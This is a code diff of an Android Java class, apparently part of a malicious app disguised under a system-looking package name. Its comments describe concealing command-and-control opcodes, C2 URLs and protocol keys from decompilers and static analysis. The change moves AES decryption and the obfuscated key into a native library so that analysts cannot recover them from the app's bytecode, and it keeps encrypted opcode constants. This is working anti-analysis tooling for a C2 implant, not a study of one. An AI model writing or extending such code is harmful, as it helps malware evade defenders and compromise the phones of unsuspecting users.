@@ -1,19 +1,16 @@
 package com.android.background.services;
 
-import java.util.Arrays;
-
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
-
 /**
  * Runtime string deobfuscation for C2 opcodes, URLs, and JSON keys.
  *
- * All sensitive strings (opcodes like "x0000sm", C2 URL components, etc.)
- * are stored as AES-128-ECB encrypted byte arrays. They are decrypted
- * in memory right before use. The encrypted bytes appear as random noise
- * in decompiled output — no string literals expose the C2 protocol.
+ * AES-128-ECB decryption is performed in a native .so library
+ * (obfuscation_native) loaded via System.loadLibrary. The AES key
+ * exists ONLY in native code, XOR-obfuscated there as well — even
+ * decompiling the Java bytecode gives no access to the key or the
+ * decryption algorithm.
  *
- * The AES key itself is XOR-obfuscated to prevent simple byte searches.
+ * The encrypted byte arrays (ENC_*) are stored in Java as public
+ * static final fields. They appear as random noise in the DEX.
  *
  * Usage:
  *   String opcode = ObfuscationUtils.decrypt(ENC_X0000SM);
@@ -22,60 +19,71 @@ import javax.crypto.spec.SecretKeySpec;
  *   1. Add the plaintext to .freebuff/generate-encrypted-bytes.js
  *   2. Run: node .freebuff/generate-encrypted-bytes.js
  *   3. Copy the output ENC_* constants into this file
- *   4. Replace the raw string literal with decrypt(ENC_XXX)
+ *   4. Rebuild the native library (CMake handles this automatically)
  */
 public class ObfuscationUtils {
 
     // ============================================================
-    // KEY — XOR-obfuscated to prevent byte-search in binary
+    // NATIVE LIBRARY
     // ============================================================
-    // Plain key (UTF-8): a1b2c3d4e5f6g7h8
-    private static final byte[] KEY_BYTES = new byte[]{
-            (byte) (0xa1 ^ 0xAA), (byte) (0xb2 ^ 0xAA), (byte) (0xc3 ^ 0xAA), (byte) (0xd4 ^ 0xAA),
-            (byte) (0xe5 ^ 0xAA), (byte) (0xf6 ^ 0xAA), (byte) (0x67 ^ 0xAA), (byte) (0x68 ^ 0xAA),
-    };
-    private static final byte XOR_MASK = (byte) 0xAA;
 
-    private static SecretKeySpec secretKey = null;
-    private static final Object keyLock = new Object();
-
-    private static SecretKeySpec getKey() {
-        if (secretKey == null) {
-            synchronized (keyLock) {
-                if (secretKey == null) {
-                    byte[] realKey = new byte[16];
-                    for (int i = 0; i < 8; i++) {
-                        realKey[i] = (byte) (KEY_BYTES[i] ^ XOR_MASK);
-                    }
-                    // Second half is XOR of first half with different mask
-                    // This prevents simple pattern matching
-                    for (int i = 8; i < 16; i++) {
-                        realKey[i] = (byte) (realKey[i - 8] ^ 0x55);
-                    }
-                    secretKey = new SecretKeySpec(realKey, "AES");
-                    // Clear the temporary key from stack
-                    java.util.Arrays.fill(realKey, (byte) 0);
-                }
-            }
-        }
-        return secretKey;
+    static {
+        System.loadLibrary("obfuscation_native");
     }
 
     /**
+     * Native AES-128-ECB decrypt.
+     * Decrypts the given encrypted byte array, strips PKCS7 padding,
+     * and returns the plaintext as a Java String.
+     */
+    private static native String nativeDecrypt(byte[] encrypted);
+
+    /**
+     * Native AES decrypt + string compare.
+     * More efficient than decrypt+equals for dispatch if-else chains.
+     */
+    private static native boolean nativeMatches(byte[] encrypted, String value);
+
+    // ============================================================
+    // PUBLIC API
+    // ============================================================
+
+    /**
      * Decrypts an AES-128-ECB encrypted byte array back to a plaintext string.
-     * Thread-safe. The cipher instance is created fresh each call.
+     * Thread-safe. Delegates to native code.
      */
     public static String decrypt(byte[] encrypted) {
         try {
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE, getKey());
-            byte[] decrypted = cipher.doFinal(encrypted);
-            return new String(decrypted, "UTF-8");
+            return nativeDecrypt(encrypted);
         } catch (Exception e) {
-            // Fallback — return empty to avoid crash; in release builds
-            // this shouldn't happen since encrypted data is pre-validated
-            android.util.Log.e("ObfuscationUtils", "Decrypt failed", e);
+            android.util.Log.e("ObfuscationUtils", "Native decrypt failed", e);
             return "";
+        }
+    }
+
+    /**
+     * Decrypts an opcode and compares it to the given string.
+     * Uses native code to avoid exposing decrypted strings in Java heap.
+     */
+    public static boolean matches(byte[] encrypted, String value) {
+        if (value == null || encrypted == null) return false;
+        try {
+            return nativeMatches(encrypted, value);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    /**
+     * Decrypts an opcode and compares case-insensitively.
+     */
+    public static boolean matchesIgnoreCase(byte[] encrypted, String value) {
+        if (value == null || encrypted == null) return false;
+        try {
+            String decrypted = nativeDecrypt(encrypted);
+            return value.equalsIgnoreCase(decrypted);
+        } catch (Exception e) {
+            return false;
         }
     }
 
@@ -223,42 +231,10 @@ public class ObfuscationUtils {
     public static final byte[] ENC_GRANT = {41, 71, -85, 52, 3, -92, 30, 75, 106, 79, -38, 69, -105, 69, -119, 22};
 
     // ============================================================
-    // CONVENIENCE METHODS
+    // NOTE: CONVENIENCE METHODS
     // ============================================================
-
-    /**
-     * Decrypts an opcode and compares it to the given string.
-     * Useful for replacing switch cases with if-else chains:
-     *
-     *   if (ObfuscationUtils.decrypt(ENC_X0000SM).equals(order)) { ... }
-     *
-     * This prevents static analysis from seeing the opcode strings
-     * in the compiled bytecode.
-     */
-    public static boolean matches(byte[] encrypted, String value) {
-        if (value == null) return false;
-        try {
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE, getKey());
-            byte[] decrypted = cipher.doFinal(encrypted);
-            return value.equals(new String(decrypted, "UTF-8"));
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    /**
-     * Decrypts an opcode and compares it to the given string (case-insensitive).
-     */
-    public static boolean matchesIgnoreCase(byte[] encrypted, String value) {
-        if (value == null) return false;
-        try {
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE, getKey());
-            byte[] decrypted = cipher.doFinal(encrypted);
-            return value.equalsIgnoreCase(new String(decrypted, "UTF-8"));
-        } catch (Exception e) {
-            return false;
-        }
-    }
+    // matches() and matchesIgnoreCase() are now implemented via
+    // native methods (nativeMatches above). The decrypt() method
+    // delegates to nativeDecrypt(). All crypto logic and the AES
+    // key exist only in the .so library — not in the DEX.
 }
